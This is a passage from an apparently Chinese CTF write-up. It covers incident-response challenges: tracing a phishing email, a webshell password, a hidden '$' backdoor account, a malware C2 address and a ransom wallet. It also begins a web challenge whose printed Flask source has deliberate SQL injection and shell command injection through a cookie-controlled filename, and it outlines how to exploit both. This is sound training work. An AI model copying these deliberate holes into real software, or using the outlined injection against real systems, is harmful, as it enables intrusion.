<p>​	在<code>下载</code>里发现邮件，也可使用<code>everthing</code>按文件时间排序，找到最近修改的文件。</p>
<p>​	用记事本打开即可发现发件人邮箱，也可以用<a target="_blank" rel="noopener" href="https://products.aspose.app/email/zh/editor/eml">在线 EML 编辑器</a></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120172214385.png" alt="image-20250120172214385"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120172256667.png" alt="image-20250120172256667"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;wspz@hacker.com&#125;</span><br></pre></td></tr></table></figure>



<h3 id="应急响应-2一句话木马"><a href="#应急响应-2一句话木马" class="headerlink" title="应急响应-2一句话木马"></a>应急响应-2一句话木马</h3><p>​	<strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>Peng<br>    <b style="color:cyan;">难度: </b>中等</p>
<p>​	黑客写入的一句话木马的连接密码是？</p>
<p>​	例：XAUTCTF{cmd}</p>
<p><strong>题解</strong></p>
<p>​	在桌面看到安装了phpstudy，打开网站发现是空白</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120174109933.png" alt="image-20250120174109933"></p>
<p><strong>方法一</strong></p>
<p>​	打开网站根目录查看，经过搜索，发现是蝉知7.7系统，后台地址是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/www/admin.php</span><br></pre></td></tr></table></figure>

<p>​	账号密码用edge浏览器打开时有记录，直接登录</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120174747285.png" alt="image-20250120174747285"></p>
<p>​	搜索蝉知7.7漏洞，找到文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/120005727">蝉知企业门户系统v7.7 - 命令执行漏洞_蝉知7.7-CSDN博客</a></p>
<p>​	得知可以在设计-高级中写一句话木马，最终，在首页发现一句话木马</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120175024429.png" alt="image-20250120175024429"></p>
<p><strong>方法二</strong></p>
<p>​	使用d盾查杀网站文件，直接找到后门</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120183755800.png" alt="image-20250120183755800"></p>
<p>​	也可以直接在文件中搜索eval等关键词</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;easyshell&#125;</span><br></pre></td></tr></table></figure>



<h3 id="应急响应-3后门用户"><a href="#应急响应-3后门用户" class="headerlink" title="应急响应-3后门用户"></a>应急响应-3后门用户</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>入门</p>
<p>​	黑客的添加的后门用户是？</p>
<p>​	例：XAUTCTF{hacker}</p>
<p><strong>题解</strong></p>
<p>​	<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/123478562">网络搜索</a>得知，windows用户名后加<code>$</code>便无法通过<code>net user</code>命令查询到</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120175404438.png" alt="image-20250120175404438"></p>
<p><strong>方法一</strong></p>
<p>​	在windows开始菜单，点击头像即可显示后门用户</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120175526026.png" alt="image-20250120175526026"></p>
<p><strong>方法二</strong></p>
<p>​	在控制面板中查询后门用户，此时可以看到，后门用户是Administrator管理员权限，更加确定是黑客为了维持权限而创建的用户</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120175908062.png" alt="image-20250120175908062"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;wshacker$&#125;</span><br></pre></td></tr></table></figure>



<h3 id="应急响应-4病毒文件"><a href="#应急响应-4病毒文件" class="headerlink" title="应急响应-4病毒文件"></a>应急响应-4病毒文件</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>中等</p>
<p>​	黑客植入的病毒程序的外连ip及端口是</p>
<p>​	例：XAUTCTF{192.168.0.1:8080}</p>
<p><strong>题解</strong></p>
<p>​	在c盘根目录发现奇怪的程序，也可用everything找到，也可用火绒杀毒找到</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120180924493.png" alt="image-20250120180924493"></p>
<p>​	拖入<a target="_blank" rel="noopener" href="https://s.threatbook.com/">微步在线云沙箱</a>分析，得到<a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/ba81f23fbff64d822ed871b596751e0d1299f8030cf9ac9af6b84456fad35d28">样本报告</a>，发现确实是病毒文件</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120181250171.png" alt="image-20250120181250171"></p>
<p>​	在网络行为里找到ip和端口</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120181155157.png" alt="image-20250120181155157"></p>
<p>​	也可运行在虚拟机运行程序后使用 <code>netstat -ano</code>命令查看</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120211531033.png" alt="image-20250120211531033"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;202.97.36.184:4782&#125;</span><br></pre></td></tr></table></figure>



<h3 id="应急响应-5勒索钱包"><a href="#应急响应-5勒索钱包" class="headerlink" title="应急响应-5勒索钱包"></a>应急响应-5勒索钱包</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>简单</p>
<p>​	黑客留下的勒索钱包地址是？</p>
<p>​	例：XAUTCTF{1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa}</p>
<p><strong>题解</strong></p>
<p>​	在桌面的勒索信中找到钱包地址</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120183539375.png" alt="image-20250120183539375"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;1oixtLbBewubT5cvRPd86ZEDLKgDFUe47C&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>事件还原</strong></p>
<p>​	综合以上分析可以推测：</p>
<p>​	Peng用phpstudy搭建了<strong>蝉知7.7</strong>系统，并且使用<strong>Cpolar</strong>内网穿透到了公网，分享给其他人访问，但因贪小便宜点击了钓鱼邮件，泄露了<strong>常用密码</strong>，黑客使用密码成功进入后台，由于没有安装最新网站系统，存在安全漏洞，被植入<strong>一句话木马</strong>，黑客利用一句话木马，添加了<strong>后门用户</strong>，植入了<strong>恶意病毒</strong>，获得了电脑的完整控制权。</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="2048Game"><a href="#2048Game" class="headerlink" title="2048Game"></a>2048Game</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>cykan</br><br>​	<b style="color:cyan;">难度: </b>困难</br></p>
<p>​	python代码审计，有”一”点难度</p>
<p><strong>题解</strong></p>
<p>​	进入题目为登录窗口，同时给出了题目源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, make_response</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration constants</span></span><br><span class="line">BASE_DIR = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">timeout = <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span>  <span class="comment"># ms</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Database configuration</span></span><br><span class="line">DB_NAME = <span class="string">&#x27;users.db&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db_connection</span>():</span><br><span class="line">    conn = sqlite3.connect(DB_NAME)</span><br><span class="line">    conn.row_factory = sqlite3.Row</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_db</span>():</span><br><span class="line">    conn = get_db_connection()</span><br><span class="line">    conn.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">            id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">            username TEXT UNIQUE NOT NULL,</span></span><br><span class="line"><span class="string">            password TEXT NOT NULL</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_time_now</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get current timestamp (milliseconds)</span></span><br><span class="line"><span class="string">    :return: Current timestamp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(datetime.now().timestamp() * <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">command: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Function to execute system commands using Python, for future use</span></span><br><span class="line"><span class="string">    :param command: System command</span></span><br><span class="line"><span class="string">    :return: Output of the executed command</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    logger.info(<span class="string">f&quot;Executing command: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br><span class="line">    result = subprocess.run(command, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_file_with_path</span>(<span class="params">file_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Create a file at the given path and write the expiration time</span></span><br><span class="line"><span class="string">    :param file_path: Storage path for the file</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    directory = os.path.dirname(file_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        os.makedirs(directory)</span><br><span class="line">        logger.info(<span class="string">f&quot;Created directory: <span class="subst">&#123;directory&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(<span class="built_in">str</span>(get_time_now() + timeout) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;Created file: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_session</span>(<span class="params">sess_id: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Save session value to corresponding file</span></span><br><span class="line"><span class="string">    :param sess_id: Session value</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    session_file_name = <span class="string">&quot;session_&quot;</span> + sess_id</span><br><span class="line">    create_file_with_path(os.path.join(BASE_DIR, session_file_name))</span><br><span class="line">    logger.info(<span class="string">f&quot;Saved session: <span class="subst">&#123;sess_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checking_session_survival</span>(<span class="params">directory: <span class="built_in">str</span>, sess_id: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check if the corresponding session is still valid by traversing the session folder</span></span><br><span class="line"><span class="string">    :param directory: File path to traverse</span></span><br><span class="line"><span class="string">    :param sess_id: Session value to find</span></span><br><span class="line"><span class="string">    :return: Whether the session is still valid</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    logger.info(<span class="string">f&quot;Traversing directory: <span class="subst">&#123;directory&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> Path(directory).rglob(<span class="string">&#x27;*&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> item.is_file():</span><br><span class="line">            logger.info(<span class="string">f&#x27;Processing file: <span class="subst">&#123;item&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> sess_id <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(item):</span><br><span class="line">                logger.debug(<span class="string">f&quot;<span class="subst">&#123;sess_id = &#125;</span>&quot;</span>)</span><br><span class="line">                logger.info(<span class="string">f&quot;Filename does not contain SESSID: <span class="subst">&#123;item&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            now_time = get_time_now()</span><br><span class="line">            over_time = run_command(<span class="string">&quot;cat %s&quot;</span> % <span class="built_in">str</span>(item))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(over_time) &lt; <span class="built_in">int</span>(now_time):</span><br><span class="line">                    logger.info(<span class="string">&quot;SESSID expired&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logger.info(<span class="string">&quot;SESSID valid&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">                logger.error(<span class="string">f&quot;Error processing file: <span class="subst">&#123;<span class="built_in">str</span>(ex)&#125;</span>&quot;</span>)</span><br><span class="line">    logger.warning(<span class="string">&quot;No valid file found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = get_db_connection()</span><br><span class="line">        user = conn.execute(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;%s&#x27;&quot;</span> % username).fetchone()</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        logger.error(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(ex) = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">and</span> check_password_hash(user[<span class="string">&#x27;password&#x27;</span>], password):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Login successful</span></span><br><span class="line">        <span class="comment"># Create a unique session ID</span></span><br><span class="line">        sess_id = request.cookies.get(<span class="string">&#x27;SESSID&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> sess_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            sess_id = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create response</span></span><br><span class="line">        response = make_response(render_template(<span class="string">&#x27;index.html&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set cookie</span></span><br><span class="line">        response.set_cookie(<span class="string">&#x27;SESSID&#x27;</span>, sess_id, httponly=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Here you might want to save this session ID on the server side, e.g., store it in the database</span></span><br><span class="line">        save_session(sess_id)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># Login failed, return failure page</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;403.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    sess_id = request.cookies.get(<span class="string">&#x27;SESSID&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sess_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> checking_session_survival(BASE_DIR, sess_id):</span><br><span class="line">            logger.info(<span class="string">&quot;Check successful&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.info(<span class="string">&quot;Check failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Initialize the database</span></span><br><span class="line">    init_db()</span><br><span class="line"></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># getdb.py</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> generate_password_hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Database configuration</span></span><br><span class="line">DB_NAME = <span class="string">&#x27;users.db&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db_connection</span>():</span><br><span class="line">    conn = sqlite3.connect(DB_NAME)</span><br><span class="line">    conn.row_factory = sqlite3.Row</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_db</span>():</span><br><span class="line">    conn = get_db_connection()</span><br><span class="line">    conn.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">            id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">            username TEXT UNIQUE NOT NULL,</span></span><br><span class="line"><span class="string">            password TEXT NOT NULL</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_random_users</span>(<span class="params">num_users: <span class="built_in">int</span></span>):</span><br><span class="line">    conn = get_db_connection()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_users):</span><br><span class="line">        username = generate_random_string(<span class="number">8</span>)  <span class="comment"># 8-character username</span></span><br><span class="line">        password = generate_random_string(<span class="number">12</span>)  <span class="comment"># 12-character password</span></span><br><span class="line">        hashed_password = generate_password_hash(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn.execute(<span class="string">&#x27;INSERT INTO users (username, password) VALUES (?, ?)&#x27;</span>,</span><br><span class="line">                         (username, hashed_password))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Added user: <span class="subst">&#123;username&#125;</span> with password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Username <span class="subst">&#123;username&#125;</span> already exists, skipping.&quot;</span>)</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the database and add random users</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    init_db()</span><br><span class="line">    add_random_users(<span class="number">5</span>)  <span class="comment"># Add 5 random users</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Database created and random users added.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​	漏洞点在于<code>app.py</code>中的<code>login</code>路由可以自定义<code>sess_id</code>，在登录成功后，会被作为文件名写入在<code>/tmp</code>目录下，而在<code>index</code>路由中有对于session是否存活的检测，其中存在命令执行函数，会使用<code>cat</code>命令获取文件内容，而倘若文件名是恶意命令拼接，则会导致<code>RCE</code>。</p>
<p>​	要解此题，我们首先需要进行登录，写入带有恶意文件名，在访问根路由进行<code>RCE</code>。</p>
<p>​	根据源码，在<code>app.py</code>中的第使用了不安全的第130行使用了不安全的<code>sql</code>语句的构造方法，并且<code>username</code>可控，这便会造成<code>sql</code>注入问题，根据<code>getdb.py</code>源码来看，数据库中存在随机生成的账户和密码哈希，即使通过<code>sql</code>注入获取到了该账户和密码哈希也无法进行破解，无法借此登录。</p>
<p>​	此时需要转变下思路，既然不知道账户密码，我们可以仿照格式利用<code>sql</code>注入来伪造一个账户，例如我想要伪造一个账户名为<code>BR</code>，密码为<code>123456</code>的账户，仿照<code>getdb.py</code>中<code>add_random_users()</code>函数的方法，执行以下<code>sql</code>语句：</p>
